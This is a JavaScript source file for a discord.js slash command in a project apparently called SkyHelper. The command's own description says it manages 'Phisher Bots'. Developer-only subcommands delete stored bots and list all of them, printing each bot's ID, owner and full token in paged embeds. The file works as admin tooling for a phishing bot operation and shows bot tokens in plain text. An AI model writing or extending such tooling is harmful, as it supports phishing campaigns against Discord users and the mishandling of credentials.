import { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder } from "discord.js";
import * as SHDB from "/root/SkyHelper/database.js";

export const data = new SlashCommandBuilder()
  .setName("dbots")
  .setDescription("Manage Phisher Bots.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("delete")
      .setDescription("Deletes a phisher bot.")
      .addStringOption((option) => option.setName("bot_id").setDescription("The bot ID to delete.").setRequired(true))
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("list")
      .setDescription("Lists all bots.")
      .addUserOption((option) => option.setName("owner").setDescription("The bot owner."))
  )
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (!client.config.devs.includes(interaction.user.id)) {
    return client.sendErrorEmbed(interaction, "You are not allowed to use this command.");
  }

  const subcommand = interaction.options.getSubcommand();
  if (subcommand == "delete") {
    const botID = interaction.options.getString("bot_id");
    const botInfo = await SHDB.getBot(botID);
    if (!botInfo) {
      return client.sendErrorEmbed(interaction, "This bot ID does not exist");
    }
    await SHDB.deleteBot(botID);
    await client.skyhelper.deleteBot(botID);

    const embed = new EmbedBuilder()
      .setColor("Red")
      .setTitle("🚫 Bot Deleted")
      .addFields({ name: "Bot ID", value: `\`\`\`${botID}\`\`\`` });

    await interaction.reply({ embeds: [embed], ephemeral: true });
  } else if (subcommand == "list") {
    const owner = interaction.options.getUser("owner");
    const bots = owner ? await SHDB.getBotsByUserID(owner.id) : await SHDB.getBots();
    const id = interaction.user.id;
    const embeds = [];
    var page = 0;

    var embed = new EmbedBuilder().setColor("Purple").setTitle("Bots");
    var i = 0;
    for (const { token, id, owner } of bots) {
      i++;
      embed.addFields(
        { name: `${i}. Bot ID`, value: `\`\`\`${id}\`\`\``, inline: true },
        { name: "Bot Token", value: `\`\`\`${token}\`\`\``, inline: true },
        { name: "Bot Owner ID", value: `\`\`\`${owner}\`\`\``, inline: true }
      );

      if (i % 5 == 0) {
        embeds.push(embed);
        embed = new EmbedBuilder().setColor("Purple").setTitle("Bots");
      }
    }
    if (i == 0 || i % 5 != 0) {
      embeds.push(embed);
    }

    const pageEmbed = embeds[page];

    const filter = (i) => i.user.id === interaction.user.id;
    const time = 1000 * 60 * 5;

    await interaction.reply({ ephemeral: true, embeds: [pageEmbed], components: [getRow(page, embeds, id)] });

    const collector = interaction.channel.createMessageComponentCollector({ filter, time });

    collector.on("collect", async (i) => {
      if (!i) {
        return;
      }

      await i.deferUpdate();

      if (i.customId != "prev_embed" && i.customId != "next_embed") {
        return;
      }

      if (i.customId == "prev_embed" && page > 0) {
        page--;
      } else if (i.customId == "next_embed" && page < embeds.length - 1) {
        page++;
      }

      await interaction.editReply({ embeds: [embeds[page]], components: [getRow(page, embeds, id)] });
    });
  }
}

function getRow(page, embeds, id) {
  const row = new ActionRowBuilder();

  row.addComponents(
    new ButtonBuilder()
      .setCustomId("prev_embed")
      .setStyle("Secondary")
      .setEmoji("◀️")
      .setDisabled(page == 0)
  );

  row.addComponents(
    new ButtonBuilder()
      .setCustomId("next_embed")
      .setStyle("Secondary")
      .setEmoji("▶️")
      .setDisabled(page == embeds.length - 1)
  );

  return row;
}
